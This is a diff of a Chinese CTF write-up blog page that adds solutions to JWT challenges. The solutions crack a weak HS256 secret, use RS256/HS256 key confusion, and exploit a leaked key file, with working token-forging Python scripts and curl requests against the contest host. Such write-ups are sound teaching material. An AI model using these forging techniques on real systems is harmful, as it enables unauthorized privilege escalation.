@@ -15,7 +15,7 @@
 <meta name="twitter:description" content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://blog.xxchenchen.top/img/qingcenctf-cover.svg' />
     <link rel="shortcut icon" href="/favicon.png" />
-<link rel="stylesheet" href='/css/custom.css?v=1782042230'>
+<link rel="stylesheet" href='/css/custom.css?v=1782199529'>
 
     </head>
     <body class="
@@ -319,9 +319,10 @@
     </li>
     <li><a href="#ezjwt">EZJWT</a>
       <ol>
-        <li><a href="#ezjwt-1">EZJWT</a></li>
-        <li><a href="#ezjwt_1">EZJWT_1</a></li>
-        <li><a href="#ezjwt_2">EZJWT_2</a></li>
+        <li><a href="#ezjwtjwt-弱密钥破解">EZJWT（JWT 弱密钥破解）</a></li>
+        <li><a href="#ezjwt_1rsa-key-confusion-算法混淆攻击">EZJWT_1（RSA Key Confusion 算法混淆攻击）</a></li>
+        <li><a href="#ezjwt_2jwt-签名密钥泄露">EZJWT_2（JWT 签名密钥泄露）</a></li>
+        <li><a href="#ezjwt_3jwt-kid-参数-sql-注入">EZJWT_3（JWT kid 参数 SQL 注入）</a></li>
       </ol>
     </li>
     <li><a href="#ezpop">EZPOP</a>
@@ -581,7 +582,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 17 分钟
+                    阅读时长: 23 分钟
                 </time>
             </div>
         
@@ -598,7 +599,7 @@
 
 
 
-                <span class="article-time--wordcount">8418 字</span>
+                <span class="article-time--wordcount">11342 字</span>
             </div>
         
     </footer>
@@ -1957,10 +1958,553 @@
 </ol>
 <p><strong>Flag：</strong> <code>flag{0f9d1155-c030-4996-9b7e-c0d999274f44}</code></p>
 <h2 id="ezjwt">EZJWT
-</h2><h3 id="ezjwt-1">EZJWT
-</h3><h3 id="ezjwt_1">EZJWT_1
-</h3><h3 id="ezjwt_2">EZJWT_2
-</h3><h2 id="ezpop">EZPOP
+</h2><h3 id="ezjwtjwt-弱密钥破解">EZJWT（JWT 弱密钥破解）
+</h3><p><strong>漏洞类型：</strong> JWT（JSON Web Token）弱密钥 / 弱密钥签名绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个&quot;安全审计控制台&quot;页面，页面内容受 JWT 权限控制。首次访问时服务端会发放一个 <code>role: guest</code> 的 JWT Cookie，只有 <code>role: admin</code> 的用户才能看到 flag。</p>
+<p>关键点：</p>
+<ul>
+<li>首次访问 <code>/</code> 会获得两个 Cookie：<code>boot_id</code> 和 <code>auth_token</code>（JWT）</li>
+<li><code>auth_token</code> 的 JWT 使用 HS256 算法签名，payload 中包含 <code>username</code> 和 <code>role</code> 字段</li>
+<li>页面检查 <code>role</code> 值，只有 <code>admin</code> 权限才会在页面上显示 flag</li>
+<li>JWT 签名密钥为弱密钥，可被爆破破解</li>
+<li>需要同时携带 <code>boot_id</code> 和 <code>auth_token</code> 两个 Cookie 才能正常获取页面内容</li>
+</ul>
+<p><strong>攻击思路：</strong> 获取服务端发放的 JWT → 分析 JWT 结构 → 爆破弱密钥 → 伪造 admin 角色的 JWT → 替换 Cookie 获取 flag</p>
+<p><strong>Step 1：获取并分析 JWT</strong></p>
+<p>首次访问页面，服务端通过 <code>Set-Cookie</code> 返回 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -v http://docker.qingcen.net:45776/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>响应头中包含：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Set-Cookie: boot_id=8ea0fc7814176631; ...
+</span></span><span class="line"><span class="cl">Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0.2s6Ssv1pE5dLPJUWfaVI2apGc2nNC3jAhydYOrwOrMw; ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：解码 JWT</strong></p>
+<p>将 JWT 的三段用 base64 解码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Header</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;HS256&#34;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;username&#34;:&#34;guest&#34;,&#34;role&#34;:&#34;guest&#34;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析得出：</p>
+<ul>
+<li>算法：HS256（HMAC-SHA256 对称签名）</li>
+<li>身份：<code>username: guest, role: guest</code></li>
+<li>目标：将 <code>role</code> 篡改为 <code>admin</code></li>
+</ul>
+<p><strong>Step 3：爆破 JWT 密钥</strong></p>
+<p>HS256 使用共享密钥签名，服务端若使用弱密钥则可被爆破。用常见弱密钥字典尝试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header_payload</span> <span class="o">=</span> <span class="s2">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">expected_sig</span> <span class="o">=</span> <span class="s2">&#34;2s6Ssv1pE5dLPJUWfaVI2apGc2nNC3jAhydYOrwOrMw&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">secrets</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;secret&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">,</span> <span class="s2">&#34;jwt_secret&#34;</span><span class="p">,</span> <span class="s2">&#34;jwt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;changeme&#34;</span><span class="p">,</span> <span class="s2">&#34;default&#34;</span><span class="p">,</span> <span class="s2">&#34;guest&#34;</span><span class="p">,</span> <span class="s2">&#34;ezjwt&#34;</span><span class="p">,</span> <span class="s2">&#34;qingcen&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">secrets</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">header_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">sig</span> <span class="o">==</span> <span class="n">expected_sig</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;密钥是: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果：密钥为 <code>secret</code>（最常见的 JWT 弱密钥之一）。</p>
+<p><strong>Step 4：伪造 admin 角色的 JWT</strong></p>
+<p>用破解的密钥签发一个 <code>role: admin</code> 的新 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">,</span><span class="s2">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;HS256&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;role&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">header_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;secret&#34;</span><span class="p">,</span> <span class="n">header_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header_payload</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成的 admin JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.bFjUBp21E-EN4dQKynzRDrSriibsoxmcE3eM59n15N0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 5：携带伪造 JWT 获取 Flag</strong></p>
+<p>⚠️ 关键踩坑点：必须同时携带 <code>boot_id</code> 和 <code>auth_token</code> 两个 Cookie，否则页面返回空白。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s -b &#34;boot_id=8ea0fc7814176631; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.bFjUBp21E-EN4dQKynzRDrSriibsoxmcE3eM59n15N0&#34; http://docker.qingcen.net:45776/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面返回完整的&quot;安全审计控制台&quot;，权限显示为 <code>admin</code>，flag 出现在页面中：</p>
+<p><strong>Flag：</strong> <code>flag{fe87638b-01bb-4be0-ac4f-94159d6ebdec}</code></p>
+<h3 id="ezjwt_1rsa-key-confusion-算法混淆攻击">EZJWT_1（RSA Key Confusion 算法混淆攻击）
+</h3><p><strong>漏洞类型：</strong> JWT 算法混淆攻击（RSA Key Confusion / Algorithm Confusion）</p>
+<p><strong>题目分析：</strong></p>
+<p>目标页面与 EZJWT 相同，是一个&quot;安全审计控制台&quot;，但本题使用了 <strong>RS256</strong>（RSA-SHA256 非对称签名）而非 HS256。页面泄露了 RSA 公钥，可通过算法混淆绕过签名验证。</p>
+<p>关键点：</p>
+<ul>
+<li>JWT 使用 RS256 算法（<code>alg: RS256</code>），payload 中 <code>role: guest</code></li>
+<li>页面暴露了 RSA 公钥路径 <code>/pubkey.pem</code>（实际路径 <code>/var/www/html/pubkey.pem</code>）</li>
+<li><code>/private.pem</code> 存在但返回 403 禁止访问</li>
+<li>页面提示&quot;采用了非对称加密技术来确保系统安全&quot;</li>
+<li>服务端在验证 JWT 时，若 <code>alg</code> 为 HS256，会错误地使用 RSA 公钥的 PEM 文件内容作为 HMAC 密钥</li>
+</ul>
+<p><strong>攻击原理：</strong></p>
+<p>RSA Key Confusion 是 JWT 中经典的算法混淆漏洞。当服务端同时支持 RS256 和 HS256 时：</p>
+<ul>
+<li>RS256 使用私钥签名、公钥验证（非对称）</li>
+<li>HS256 使用同一个密钥签名和验证（对称）</li>
+</ul>
+<p>如果攻击者将 JWT 头部的 <code>alg</code> 从 <code>RS256</code> 改为 <code>HS256</code>，服务端会用 <strong>RSA 公钥</strong> 作为 HMAC 密钥来验证签名。由于攻击者拥有公钥，可以自行生成合法的 HMAC 签名。</p>
+<p><strong>攻击思路：</strong> 获取公钥 → 将 JWT 算法改为 HS256 → 用公钥 PEM 文件内容作为 HMAC 密钥签名 → 伪造 admin 角色 JWT</p>
+<p><strong>Step 1：分析 JWT 结构</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -v http://docker.qingcen.net:49583/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码 Cookie 中的 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Header</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;username&#34;:&#34;guest&#34;,&#34;role&#34;:&#34;guest&#34;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：获取 RSA 公钥</strong></p>
+<p>页面源码中泄露了公钥路径：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s http://docker.qingcen.net:49583/pubkey.pem
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN PUBLIC KEY-----
+</span></span><span class="line"><span class="cl">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJD/WErY8fElq7aA2YvqsWOJZU
+</span></span><span class="line"><span class="cl">Mjixom30Bkl1b3/N19D6ePeISdZDmLTLyuOu20zDd7NWiGnrjM0XTJz1C3BB/E0e
+</span></span><span class="line"><span class="cl">wU7hFmugmmn5B2Gc+K0c2TbPcY72Bx79US1j30kH1DY4nCy9AELDYaSQCfL/tLQa
+</span></span><span class="line"><span class="cl">gk+CSSd5e4HF0CkQvQIDAQAB
+</span></span><span class="line"><span class="cl">-----END PUBLIC KEY-----
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：RSA Key Confusion — 伪造 admin JWT</strong></p>
+<p>将 <code>alg</code> 从 <code>RS256</code> 改为 <code>HS256</code>，用公钥 PEM 文件的<strong>原始字节</strong>作为 HMAC 密钥签名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 读取公钥 PEM 文件原始内容</span>
+</span></span><span class="line"><span class="cl"><span class="n">pem_content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;pubkey.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将 alg 改为 HS256</span>
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">,</span><span class="s2">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;HS256&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;role&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">header_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用 PEM 文件原始字节作为 HMAC 密钥签名</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pem_content</span><span class="p">,</span> <span class="n">header_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header_payload</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成的伪造 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.NPDfQbMlomaWECXfQ6-IzJY1NPP1mVvE9Gwt5mPeTq8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>⚠️ <strong>关键踩坑点：</strong> 必须使用 PEM 文件的<strong>原始字节</strong>（含 <code>-----BEGIN PUBLIC KEY-----</code> 头尾和换行符）作为 HMAC 密钥，而不是 DER 编码的二进制数据。</p>
+<p><strong>Step 4：携带伪造 JWT 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s -b &#34;boot_id=2016cb6763be2db8; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.NPDfQbMlomaWECXfQ6-IzJY1NPP1mVvE9Gwt5mPeTq8&#34; http://docker.qingcen.net:49583/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面返回&quot;安全审计控制台&quot;，权限显示为 <code>admin</code>，flag 出现在页面中。</p>
+<p><strong>Flag：</strong> <code>flag{7892ef74-1e2f-44ff-b911-b6510d8475e6}</code></p>
+<h3 id="ezjwt_2jwt-签名密钥泄露">EZJWT_2（JWT 签名密钥泄露）
+</h3><p><strong>漏洞类型：</strong> JWT 签名密钥泄露 / 敏感文件暴露</p>
+<p><strong>题目分析：</strong></p>
+<p>目标页面与前两题相同，是一个&quot;安全审计控制台&quot;，使用 HS256 算法签名的 JWT。本题的核心考点是 <strong>签名密钥被泄露在可访问的文件路径中</strong>。</p>
+<p>关键点：</p>
+<ul>
+<li>JWT 使用 HS256 算法，头部包含 <code>kid</code>（Key ID）字段，值为 <code>key1</code></li>
+<li><code>kid</code> 通常用于标识签名密钥，服务端会根据 <code>kid</code> 值去查找对应的密钥</li>
+<li><code>/keys/</code> 目录存在但返回 403 禁止目录列表</li>
+<li><code>/keys/key1</code> 文件可直接访问，返回签名密钥明文</li>
+</ul>
